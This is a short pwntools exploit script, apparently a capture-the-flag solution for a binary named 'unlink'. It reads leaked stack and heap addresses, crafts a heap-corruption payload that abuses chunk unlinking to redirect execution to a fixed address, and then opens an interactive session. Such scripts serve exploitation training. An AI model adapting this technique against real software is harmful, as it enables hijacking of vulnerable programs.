from pwn import *

context.log_level = 'debug'
p = process('/home/unlink/unlink')
p.recvuntil('leak: ')
stack = int(p.recvline().strip(),base=16)
p.recvuntil('leak: ')
heap = int(p.recvline().strip(),base=16)
p.recvline()
s = ""
s += 'A'*4*4
s += p32(stack-0x20)
s += p32(heap+0x50)
s = s.ljust(0x50 - 0x0C, 'A')
s += p32(heap+0x50+0x8)
s += 'A'*0x4
s += p32(0x080484eb)
p.sendline(s)
p.interactive()
